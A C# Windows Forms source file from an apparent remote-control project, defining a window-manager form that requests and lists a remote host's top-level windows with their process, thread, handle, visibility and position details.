using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Server
{
    public class FrmWindowManager : FrmBase
    {
        private SocketSession _session;
        private ListView _listView;
        private TextBox _filterBox;

        public FrmWindowManager(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "窗口管理 — " + hostName;
            this.Size = new Size(1050, 550);
            this.StartPosition = FormStartPosition.CenterScreen;
            InitializeControls();
            RefreshList();
        }

        private void InitializeControls()
        {
            var topPanel = new Panel();
            topPanel.Dock = DockStyle.Top;
            topPanel.Height = 36;
            topPanel.Padding = new Padding(8, 6, 8, 4);

            var filterLabel = new Label();
            filterLabel.Text = "过滤：";
            filterLabel.AutoSize = true;
            filterLabel.Location = new Point(8, 8);

            _filterBox = new TextBox();
            _filterBox.Location = new Point(50, 5);
            _filterBox.Size = new Size(350, 22);
            SetPlaceholder(_filterBox, "标题 / 进程名 / 类名 / PID");
            _filterBox.TextChanged += (s, e) => RefreshList();

            var refreshBtn = new Button();
            refreshBtn.Text = "刷新(R)";
            refreshBtn.Location = new Point(420, 4);
            refreshBtn.Size = new Size(75, 26);
            refreshBtn.Click += (s, e) => RefreshList();

            topPanel.Controls.AddRange(new Control[] { filterLabel, _filterBox, refreshBtn });

            _listView = new ListView();
            _listView.Dock = DockStyle.Fill;
            _listView.View = View.Details;
            _listView.FullRowSelect = true;
            _listView.GridLines = true;
            _listView.Font = new Font("微软雅黑", 9F);
            _listView.Columns.Add("标题", 200);
            _listView.Columns.Add("进程名", 120);
            _listView.Columns.Add("PID", 60);
            _listView.Columns.Add("TID", 60);
            _listView.Columns.Add("句柄", 80);
            _listView.Columns.Add("可见", 50);
            _listView.Columns.Add("状态", 60);
            _listView.Columns.Add("类名", 140);
            _listView.Columns.Add("位置", 140);

            this.Controls.Add(_listView);
            this.Controls.Add(topPanel);
        }

        private static void SetPlaceholder(TextBox tb, string placeholder)
        {
            tb.Text = placeholder;
            tb.ForeColor = SystemColors.GrayText;
            tb.Enter += (s, e) =>
            {
                if (tb.Text == placeholder)
                { tb.Text = ""; tb.ForeColor = SystemColors.WindowText; }
            };
            tb.Leave += (s, e) =>
            {
                if (string.IsNullOrEmpty(tb.Text))
                { tb.Text = placeholder; tb.ForeColor = SystemColors.GrayText; }
            };
        }

        private string GetFilterText()
        {
            string txt = (_filterBox.Text ?? "").Trim();
            string placeholder = "标题 / 进程名 / 类名 / PID";
            return (txt == placeholder) ? "" : txt;
        }

        private void RefreshList()
        {
            if (_session == null) return;
            string filter = GetFilterText();
            _session.Send(ePacketType.PACKET_GET_WINDOWS_REQUEST,
                new RequestGetWindows { Filter = filter });
        }

        public void HandleResponse(ResponseGetWindows resp)
        {
            if (resp.Windows == null) return;
            this.BeginInvoke((Action)(() =>
            {
                _listView.Items.Clear();
                foreach (var w in resp.Windows)
                {
                    var item = new ListViewItem(w.Title ?? "");
                    item.SubItems.Add(w.ProcessName ?? "");
                    item.SubItems.Add(w.ProcessId.ToString());
                    item.SubItems.Add(w.ThreadId.ToString());
                    item.SubItems.Add(w.Handle ?? "");
                    item.SubItems.Add(w.IsVisible ? "是" : "否");
                    item.SubItems.Add(w.WindowState ?? "");
                    item.SubItems.Add(w.ClassName ?? "");
                    item.SubItems.Add(w.Bounds ?? "");
                    _listView.Items.Add(item);
                }
                this.Text = string.Format("窗口管理 — 共 {0} 个顶层窗口 | {1}",
                    resp.TotalCount, resp.CollectedAt);
            }));
        }
    }
}
